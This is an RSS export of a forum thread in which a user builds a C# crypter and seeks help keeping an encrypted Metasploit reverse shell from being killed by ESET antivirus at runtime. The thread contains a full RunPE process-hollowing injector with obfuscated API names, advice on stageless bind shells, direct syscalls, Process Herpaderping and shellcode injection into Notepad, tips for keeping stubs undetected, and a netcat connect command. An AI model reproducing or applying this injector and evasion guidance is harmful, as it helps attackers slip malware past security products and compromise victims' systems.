<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Antivirus runtime bypass</title>
    <link>https://0x00sec.org/t/antivirus-runtime-bypass/25574</link>
    <description>Hello,
A few weeks ago I started learning how crypters work and I decided to write my own. I chose C# language to write it. I bypassed most of the scantime detections (despite Avira and a few others) but I am really struggling with runtime. When I execute stub with a metasploit reverse shell inside everything goes well until the client tries to connect to server. At this moment process of reverse shell is being killed and flagged as detected.(I am trying to bypass Eset runtime because this is an antivirus software which I have installed on my PC) I found various techniques to evade runtime but none of them work. Techniques that I use: amsi.dll bypass (makes Eset go crazy but it&#39;s still able to end reverse shell process), thread stalling, antihooking which I added to RunPE (https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/). Could someone give me techniques/tips to bypass runtime detections to be able to open reverse shell without it being killed by antivirus?</description>
    
    <lastBuildDate>Fri, 04 Jun 2021 11:51:35 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/antivirus-runtime-bypass/25574.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Antivirus runtime bypass</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/antivirus-runtime-bypass/25574/16">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/antivirus-runtime-bypass/25574/16</link>
        <pubDate>Sun, 08 Aug 2021 02:31:11 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-25574-16</guid>
        <source url="https://0x00sec.org/t/antivirus-runtime-bypass/25574.rss">Antivirus runtime bypass</source>
      </item>
      <item>
        <title>Antivirus runtime bypass</title>
        <dc:creator><![CDATA[c0z]]></dc:creator>
        <description><![CDATA[
            <p>This is his continuation thread, <a href="https://0x00sec.org/t/my-antivirus-evasion-journey/25744/5">here</a></p>
          <p><a href="https://0x00sec.org/t/antivirus-runtime-bypass/25574/15">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/antivirus-runtime-bypass/25574/15</link>
        <pubDate>Fri, 04 Jun 2021 11:51:35 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-25574-15</guid>
        <source url="https://0x00sec.org/t/antivirus-runtime-bypass/25574.rss">Antivirus runtime bypass</source>
      </item>
      <item>
        <title>Antivirus runtime bypass</title>
        <dc:creator><![CDATA[alexa]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="nulled" data-post="5" data-topic="25574">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/nulled/40/42266_2.png" class="avatar"> nulled:</div>
<blockquote>
<pre><code class="lang-auto">
        [DllImport("kerne" + "l32.dll", SetLastError = true)]
</code></pre>
</blockquote>
</aside>
<p>idk if u did it, i was able to do the same thing that article talked about a long time ago {hooking the functions of windows defender using ninjasploit  }, and it did worked , i  added something else :</p>
<aside class="onebox githubfolder">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/jxy-s/herpaderping" target="_blank" rel="noopener nofollow ugc">github.com</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/345;"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/a/6a2d754197f4e12df445bc6098558ec49bda7198_2_690x345.png" class="thumbnail" width="690" height="345" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/a/6a2d754197f4e12df445bc6098558ec49bda7198_2_690x345.png, https://0x00sec.s3.amazonaws.com/optimized/3X/6/a/6a2d754197f4e12df445bc6098558ec49bda7198_2_1035x517.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/6/a/6a2d754197f4e12df445bc6098558ec49bda7198.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/6/a/6a2d754197f4e12df445bc6098558ec49bda7198_2_10x10.png"></div>

<h3><a href="https://github.com/jxy-s/herpaderping" target="_blank" rel="noopener nofollow ugc">jxy-s/herpaderping</a></h3>


  <p><span class="label1">Process Herpaderping proof of concept, tool, and technical deep dive. Process Herpaderping bypasses security products by obscuring the intentions of a process.</span></p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<aside class="onebox githubfolder">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/BinaryAdventure/NotepadHook" target="_blank" rel="noopener nofollow ugc">github.com</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/345;"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/f/1/f1aa4fd0f9313b329a6fac043a9d0322b6b39b3a_2_690x345.png" class="thumbnail" width="690" height="345" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/f/1/f1aa4fd0f9313b329a6fac043a9d0322b6b39b3a_2_690x345.png, https://0x00sec.s3.amazonaws.com/optimized/3X/f/1/f1aa4fd0f9313b329a6fac043a9d0322b6b39b3a_2_1035x517.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/f/1/f1aa4fd0f9313b329a6fac043a9d0322b6b39b3a.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/f/1/f1aa4fd0f9313b329a6fac043a9d0322b6b39b3a_2_10x10.png"></div>

<h3><a href="https://github.com/BinaryAdventure/NotepadHook" target="_blank" rel="noopener nofollow ugc">BinaryAdventure/NotepadHook</a></h3>


  <p><span class="label1">Demo of hooking NtCreateFile in Notepad on x64 Windows 10 using EasyHook library</span></p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>to open notepad and inject the shellcode in it, and thus every time NtCreateFile is called the shellcode is fired <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/antivirus-runtime-bypass/25574/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/antivirus-runtime-bypass/25574/14</link>
        <pubDate>Fri, 04 Jun 2021 09:29:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-25574-14</guid>
        <source url="https://0x00sec.org/t/antivirus-runtime-bypass/25574.rss">Antivirus runtime bypass</source>
      </item>
      <item>
        <title>Antivirus runtime bypass</title>
        <dc:creator><![CDATA[mose3c]]></dc:creator>
        <description><![CDATA[
            <p>You can check for jump in winsock send address and see if there A jump .<br>
that’s mean the av is hooked your function else .<br>
it maybe the Av is listinng on Kernel callback</p>
          <p><a href="https://0x00sec.org/t/antivirus-runtime-bypass/25574/13">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/antivirus-runtime-bypass/25574/13</link>
        <pubDate>Fri, 30 Apr 2021 05:45:44 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-25574-13</guid>
        <source url="https://0x00sec.org/t/antivirus-runtime-bypass/25574.rss">Antivirus runtime bypass</source>
      </item>
      <item>
        <title>Antivirus runtime bypass</title>
        <dc:creator><![CDATA[Ph03n1x_Crus4d3r]]></dc:creator>
        <description><![CDATA[
            <p>Please do, sounds very interesting</p>
          <p><a href="https://0x00sec.org/t/antivirus-runtime-bypass/25574/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/antivirus-runtime-bypass/25574/12</link>
        <pubDate>Mon, 19 Apr 2021 13:26:04 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-25574-12</guid>
        <source url="https://0x00sec.org/t/antivirus-runtime-bypass/25574.rss">Antivirus runtime bypass</source>
      </item>
      <item>
        <title>Antivirus runtime bypass</title>
        <dc:creator><![CDATA[nulled]]></dc:creator>
        <description><![CDATA[
            <p>Yeah, that’s great idea. Maybe I will try to write entire guide.</p>
          <p><a href="https://0x00sec.org/t/antivirus-runtime-bypass/25574/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/antivirus-runtime-bypass/25574/11</link>
        <pubDate>Mon, 19 Apr 2021 07:28:27 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-25574-11</guid>
        <source url="https://0x00sec.org/t/antivirus-runtime-bypass/25574.rss">Antivirus runtime bypass</source>
      </item>
      <item>
        <title>Antivirus runtime bypass</title>
        <dc:creator><![CDATA[messede]]></dc:creator>
        <description><![CDATA[
            <p>Hi <a class="mention" href="https://0x00sec.org/u/nulled">@nulled</a> , looks like you went through a nice little roller coaster evading AV’s , could you please make a separate condensed post on the whole process you went throught ? , i am sure many folks here would appreciate  that , thanks in advance <img src="https://0x00sec.org/images/emoji/twitter/blush.png?v=9" title=":blush:" class="emoji" alt=":blush:">.</p>
          <p><a href="https://0x00sec.org/t/antivirus-runtime-bypass/25574/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/antivirus-runtime-bypass/25574/10</link>
        <pubDate>Mon, 19 Apr 2021 01:45:53 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-25574-10</guid>
        <source url="https://0x00sec.org/t/antivirus-runtime-bypass/25574.rss">Antivirus runtime bypass</source>
      </item>
      <item>
        <title>Antivirus runtime bypass</title>
        <dc:creator><![CDATA[nulled]]></dc:creator>
        <description><![CDATA[
            <p>Doing great! <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> Found reasons why I got scantime detections. Basically, I started uploading stub to <a href="http://antiscan.me" rel="noopener nofollow ugc">antiscan.me</a> with different functions to find out which methods are causing detections (some sort of detection debugging). Strangely, I always got the same detections. So, I decided to rewrite entire stub and I got very interesting results. To make your stub less detectable write it as small and as simple as you can. I mean by “as small as” you need to write as little code as possible, it’s also very important to keep your functions very simple. I recommend avoiding Assembly.GetType, Assembly.Load etc. and writing directly RunPE into your main stub. Changing icon and program version also helps. And remember do not attempt connecting to the internet with your stub. Do it only in memory after RunPE injection.</p>
          <p><a href="https://0x00sec.org/t/antivirus-runtime-bypass/25574/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/antivirus-runtime-bypass/25574/9</link>
        <pubDate>Sun, 18 Apr 2021 18:25:17 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-25574-9</guid>
        <source url="https://0x00sec.org/t/antivirus-runtime-bypass/25574.rss">Antivirus runtime bypass</source>
      </item>
      <item>
        <title>Antivirus runtime bypass</title>
        <dc:creator><![CDATA[c0z]]></dc:creator>
        <description><![CDATA[
            <p>How’s it going? I’m currently reading <a href="https://github.com/D3VI5H4/Antivirus-Artifacts" rel="noopener nofollow ugc">this</a> and thought I’d post it here as it may help.</p>
          <p><a href="https://0x00sec.org/t/antivirus-runtime-bypass/25574/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/antivirus-runtime-bypass/25574/8</link>
        <pubDate>Sun, 18 Apr 2021 06:26:31 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-25574-8</guid>
        <source url="https://0x00sec.org/t/antivirus-runtime-bypass/25574.rss">Antivirus runtime bypass</source>
      </item>
      <item>
        <title>Antivirus runtime bypass</title>
        <dc:creator><![CDATA[nulled]]></dc:creator>
        <description><![CDATA[
            <p>Thank you very much for suggestions, I got next interesting results. I used meterpreter shell_bind_tcp as you suggested. Payload without being encrypted with my crypter was instantly detected by Eset. After encrypting payload and enabling Eset again there was nothing detected, so I ran my program and boom, payload was loaded into memory without any detection, I did quick look into netstat and I saw 0.0.0.0:4444 listening. I entered my VM with Parrot to try connecting into backdoor. First I tried metasploit console, but unfortunetly I couldn’t connect into backdoor. Metasploit just showed: Started bind TCP handler against mylocalip:4444 and nothing was happening. Then I tried netcat (nc -nv mylocalip 4444) and same thing here, no connection. I did nmap scan from linux against my main computer and it showed that 4444 is filtered. I disabled Eset firewall for a moment and tried connecting with netcat and I got a connection, but after using any command Eset was killing connection and process, and showed alert that there was an attempt to connect to the botnet.</p>
          <p><a href="https://0x00sec.org/t/antivirus-runtime-bypass/25574/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/antivirus-runtime-bypass/25574/7</link>
        <pubDate>Sat, 10 Apr 2021 11:06:42 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-25574-7</guid>
        <source url="https://0x00sec.org/t/antivirus-runtime-bypass/25574.rss">Antivirus runtime bypass</source>
      </item>
      <item>
        <title>Antivirus runtime bypass</title>
        <dc:creator><![CDATA[c0z]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="nulled" data-post="5" data-topic="25574">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/nulled/40/42266_2.png" class="avatar"> nulled:</div>
<blockquote>
<p>I found out that detection is only when a client (meterpreter reverse tcp shell in my case) tries to connect to the server. At a moment when stage is sent from server to client I got detection and connection is instantly killed and stub removed.</p>
</blockquote>
</aside>
<p>I would try a stageless bind shell. To me in this situation it would seem that ESET doesn’t scan the process in question until a connection is established (and all the bytes from meterpreter, stagers are there in-memory). So trying out a stageless bind shell with the same encoding options and process obfusication as you’ve used should tell you more about what part of the code it’s triggering on. If ESET doesn’t trigger on even the stageless bind shell in-memory before you connect then I would to suggest the ESET process or at the very least debug the injected process to see <strong>where</strong> it breaks and <strong>how</strong> ESET is working with the functions you have.</p>
<p>Another idea is that ESET detects that it took too long to return from the function CreateProcess or VirtualAllocEx being hooked and immediately kills the process. I would try using the system call ordinals <a href="https://gist.github.com/qtKite/819c8654507012660818f0db9af4d87e" rel="noopener nofollow ugc">dynamically</a> or directly via <a href="https://github.com/jhalon/SharpCall" rel="noopener nofollow ugc">static</a> assembly. This would alleviate your code from having function names that would get picked up when scanned.</p>
<p>Other than that, if you’re stageless shellcode doesn’t get detected in-memory before the connection, even after modifying your code to add a little more indirection and checking for the hooks replacement after your codes execution to make the EDR happy, then it might be how the communication is happening but then I don’t know lol.</p>
          <p><a href="https://0x00sec.org/t/antivirus-runtime-bypass/25574/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/antivirus-runtime-bypass/25574/6</link>
        <pubDate>Sat, 10 Apr 2021 05:24:05 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-25574-6</guid>
        <source url="https://0x00sec.org/t/antivirus-runtime-bypass/25574.rss">Antivirus runtime bypass</source>
      </item>
      <item>
        <title>Antivirus runtime bypass</title>
        <dc:creator><![CDATA[nulled]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/c0z">@c0z</a> So I did some analysis and this is not a problem with decrypting,  I set up breakpoints in a place where payload is decrypted from AES256 to bytes and I waited a bit then I moved to RunPE injection. The place where payload is decrypted wasn’t detected, I specially waited after bytes decryption to see if it’s get detected and it did not. I also set up breakpoints on WriteProcessMemory, ResumeThread, VirtualAllocEx and CreateProcess to see if any of this APIs cause detections, and they did not. I found out that detection is only when a client (meterpreter reverse tcp shell in my case) tries to connect to the server. At a moment when stage is sent from server to client I got detection and connection is instantly killed and stub removed. I have no idea how I can bypass it, as you asked I provide some code. That’s the RunPE that I use:<br>
class RunPE<br>
{<br>
[DllImport(“kern” + “el32.dll”, SetLastError = true)]<br>
public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,[Out] byte[] lpBuffer,int dwSize,out IntPtr lpNumberOfBytesRead);</p>
<pre><code>        [DllImport("kern" + "el32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress, byte[] lpBuffer,int dwSize,out IntPtr lpNumberOfBytesWritten);


        [DllImport("kerne" + "l32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kerne" + "l32.dll", EntryPoint = "Resu" + "meTh" + "read")]
        public static extern int ResumeThread(IntPtr handle);

        [DllImport("kerne" + "l32.dll", EntryPoint = "Creat" + "ePro" + "cess", CharSet = CharSet.Unicode)]
        public static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);

        [DllImport("kerne" + "l32.dll", EntryPoint = "GetT" + "hre" + "adCo" + "ntext")]
        public static extern bool GetThreadContext(IntPtr thread, int[] context);

        [DllImport("kerne" + "l32.dll", EntryPoint = "SetTh" + "readCo" + "ntext")]
        public static extern bool SetThreadContext(IntPtr thread, int[] context);

        [DllImport("ntd" + "ll.dll", EntryPoint = "N" + "tUnm" + "apVie" + "wOfSe" + "ction")]
        public static extern int NtUnmapViewOfSection(IntPtr process, IntPtr baseAddress);


        public static bool Inject(string path, byte[] data)
        {
            IntPtr ReadWrite = IntPtr.Zero;

            StartupInformation si = new StartupInformation();
            ProcessInformation pi = new ProcessInformation();

            si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
            if (!CreateProcess(path, @"\" + path + @"\", IntPtr.Zero, IntPtr.Zero, false, 4, IntPtr.Zero, null, ref si, ref pi))
                return false;

            int fileAddress = BitConverter.ToInt32(data, 60);
            int imageBase = BitConverter.ToInt32(data, fileAddress + 52);

            int[] context = new int[179];
            context[0] = 65538;

            if (!GetThreadContext(pi.ThreadHandle, context))
                return false;

            int ebx = context[41];

            byte[] BaseAddr = new byte[4];

            if (!ReadProcessMemory(pi.ProcessHandle, new IntPtr(ebx + 8), BaseAddr, 4, out ReadWrite))
                return false;

            int baseAddress = BitConverter.ToInt32(BaseAddr, 0);


            if (imageBase == baseAddress)
            {
                if (NtUnmapViewOfSection(pi.ProcessHandle, new IntPtr(baseAddress)) != 0)
                    return false;
            }

            int sizeOfImage = BitConverter.ToInt32(data, fileAddress + 80);
            int sizeOfHeaders = BitConverter.ToInt32(data, fileAddress + 84);

            bool allowOverride = false;
            int newImageBase = VirtualAllocEx(pi.ProcessHandle, new IntPtr(imageBase), new IntPtr(sizeOfImage), 12288, 64).ToInt32();

            if (newImageBase == 0)
            {
                allowOverride = true;
                newImageBase = VirtualAllocEx(pi.ProcessHandle, IntPtr.Zero, new IntPtr(sizeOfImage), 12288, 64).ToInt32();
                if (newImageBase == 0)
                    return false;
            }

            if (!WriteProcessMemory(pi.ProcessHandle, new IntPtr(newImageBase), data, sizeOfHeaders, out ReadWrite))
                return false;

            int sectionOffset = fileAddress + 248;
            short numberOfSections = BitConverter.ToInt16(data, fileAddress + 6);

            for (int I = 0; I &lt;= numberOfSections - 1; I++)
            {
                int virtualAddress = BitConverter.ToInt32(data, sectionOffset + 12);
                int sizeOfRawData = BitConverter.ToInt32(data, sectionOffset + 16);
                int pointerToRawData = BitConverter.ToInt32(data, sectionOffset + 20);

                if (sizeOfRawData != 0)
                {
                    byte[] sectionData = new byte[sizeOfRawData];
                    Buffer.BlockCopy(data, pointerToRawData, sectionData, 0, sectionData.Length);

                    if (!WriteProcessMemory(pi.ProcessHandle, new IntPtr(newImageBase + virtualAddress), sectionData, sectionData.Length, out ReadWrite))
                        return false;
                }

                sectionOffset += 40;
            }

            byte[] pointerData = BitConverter.GetBytes(newImageBase);
            if (!WriteProcessMemory(pi.ProcessHandle, new IntPtr(ebx + 8), pointerData, 4, out ReadWrite))
                return false;

            int addressOfEntryPoint = BitConverter.ToInt32(data, fileAddress + 40);

            if (allowOverride)
                newImageBase = imageBase;
            context[44] = newImageBase + addressOfEntryPoint;

            if (!SetThreadContext(pi.ThreadHandle, context))
                return false;
            if (ResumeThread(pi.ThreadHandle) == -1)
                return false;

            return true;

        }

    }
</code></pre>
<p>Edit: for some reason I cannot include beginning of code to the rest of block. <img src="https://0x00sec.org/images/emoji/twitter/neutral_face.png?v=9" title=":neutral_face:" class="emoji" alt=":neutral_face:"></p>
          <p><a href="https://0x00sec.org/t/antivirus-runtime-bypass/25574/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/antivirus-runtime-bypass/25574/5</link>
        <pubDate>Fri, 09 Apr 2021 10:39:55 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-25574-5</guid>
        <source url="https://0x00sec.org/t/antivirus-runtime-bypass/25574.rss">Antivirus runtime bypass</source>
      </item>
      <item>
        <title>Antivirus runtime bypass</title>
        <dc:creator><![CDATA[c0z]]></dc:creator>
        <description><![CDATA[
            <p>To me it sounds like when the reverse shell payload finishes getting decrypted in-memory that’s when the payload (not encrypted) in-memory gets detected. Now the question is how is it getting detected? Unfortunately only you can answer that question unless you provide more in-depth analysis of the problem and the code you’ve used.</p>
<p>I can recommend that you read <a href="https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/" rel="noopener nofollow ugc">this</a>, and that you fully understand how ESET’s runtime detection engine is working. Maybe you should also try to see which functions are blacklisted by ESET and not just Windows Defender like in the article you referenced by F-Secure.</p>
<p>Here’s a picture in the beginning of the article noting exactly the problem you are facing. It just seems the issue moved to the third-party AV installed.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/d/4dcb7f34a43265e4718cee3fd1083ce3a4d62e2d.png" data-download-href="/uploads/short-url/b6cKPqRpGHfEiA4G1NISvmmgCbb.png?dl=1" title="2021-04-08 13_02_14-Window" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/d/4dcb7f34a43265e4718cee3fd1083ce3a4d62e2d.png" alt="2021-04-08 13_02_14-Window" data-base62-sha1="b6cKPqRpGHfEiA4G1NISvmmgCbb" width="690" height="360" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/4/d/4dcb7f34a43265e4718cee3fd1083ce3a4d62e2d_2_10x10.png"></a></div><p></p>
          <p><a href="https://0x00sec.org/t/antivirus-runtime-bypass/25574/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/antivirus-runtime-bypass/25574/4</link>
        <pubDate>Thu, 08 Apr 2021 20:24:52 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-25574-4</guid>
        <source url="https://0x00sec.org/t/antivirus-runtime-bypass/25574.rss">Antivirus runtime bypass</source>
      </item>
      <item>
        <title>Antivirus runtime bypass</title>
        <dc:creator><![CDATA[nulled]]></dc:creator>
        <description><![CDATA[
            <p>I mentioned that amsi.dll doesn’t work really well with Eset.</p>
          <p><a href="https://0x00sec.org/t/antivirus-runtime-bypass/25574/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/antivirus-runtime-bypass/25574/3</link>
        <pubDate>Thu, 08 Apr 2021 14:32:48 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-25574-3</guid>
        <source url="https://0x00sec.org/t/antivirus-runtime-bypass/25574.rss">Antivirus runtime bypass</source>
      </item>
      <item>
        <title>Antivirus runtime bypass</title>
        <dc:creator><![CDATA[o0voyager0o]]></dc:creator>
        <description><![CDATA[
            <p>This is usually not my cup of tea, but over at F-secure one of the researchers have a go on the amsi.dll bypassing.</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/f/a/fac67275890f82e85f57c9ebcb7c27c1c33734ef.png" class="site-icon" width="32" height="32">
      <a href="https://blog.f-secure.com/hunting-for-amsi-bypasses/" target="_blank" rel="noopener nofollow ugc" title="08:09AM - 16 July 2019">F-Secure Blog – 16 Jul 19</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/345;"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/0/a/0aa07875b646ece9a911b8b14d7bf0eece5a1dd0_2_690x345.jpeg" class="thumbnail" width="690" height="345" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/0/a/0aa07875b646ece9a911b8b14d7bf0eece5a1dd0_2_690x345.jpeg, https://0x00sec.s3.amazonaws.com/optimized/3X/0/a/0aa07875b646ece9a911b8b14d7bf0eece5a1dd0_2_1035x517.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/0/a/0aa07875b646ece9a911b8b14d7bf0eece5a1dd0_2_1380x690.jpeg 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/0/a/0aa07875b646ece9a911b8b14d7bf0eece5a1dd0_2_10x10.png"></div>

<h3><a href="https://blog.f-secure.com/hunting-for-amsi-bypasses/" target="_blank" rel="noopener nofollow ugc">Hunting for AMSI bypasses - F-Secure Blog</a></h3>

<p>The Antimalware Scan Interface (AMSI) assists antivirus programs in detecting “script-based attacks” – e.g., malicious PowerShell or Microsoft Office macros. Even if the script used were heavily obfuscated, there will come a point where the plain...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

          <p><a href="https://0x00sec.org/t/antivirus-runtime-bypass/25574/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/antivirus-runtime-bypass/25574/2</link>
        <pubDate>Thu, 08 Apr 2021 13:56:20 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-25574-2</guid>
        <source url="https://0x00sec.org/t/antivirus-runtime-bypass/25574.rss">Antivirus runtime bypass</source>
      </item>
      <item>
        <title>Antivirus runtime bypass</title>
        <dc:creator><![CDATA[nulled]]></dc:creator>
        <description><![CDATA[
            <p>Hello,<br>
A few weeks ago I started learning how crypters work and I decided to write my own. I chose C# language to write it. I bypassed most of the scantime detections (despite Avira and a few others) but I am really struggling with runtime. When I execute stub with a metasploit reverse shell inside everything goes well until the client tries to connect to server. At this moment process of reverse shell is being killed and flagged as detected.(I am trying to bypass Eset runtime because this is an antivirus software which I have installed on my PC) I found various techniques to evade runtime but none of them work. Techniques that I use: amsi.dll bypass (makes Eset go crazy but it’s still able to end reverse shell process), thread stalling, antihooking which I added to RunPE (<a href="https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/" class="inline-onebox" rel="noopener nofollow ugc">Bypassing Windows Defender Runtime Scanning</a>). Could someone give me techniques/tips to bypass runtime detections to be able to open reverse shell without it being killed by antivirus?</p>
          <p><a href="https://0x00sec.org/t/antivirus-runtime-bypass/25574/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/antivirus-runtime-bypass/25574/1</link>
        <pubDate>Thu, 08 Apr 2021 10:30:27 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-25574-1</guid>
        <source url="https://0x00sec.org/t/antivirus-runtime-bypass/25574.rss">Antivirus runtime bypass</source>
      </item>
  </channel>
</rss>
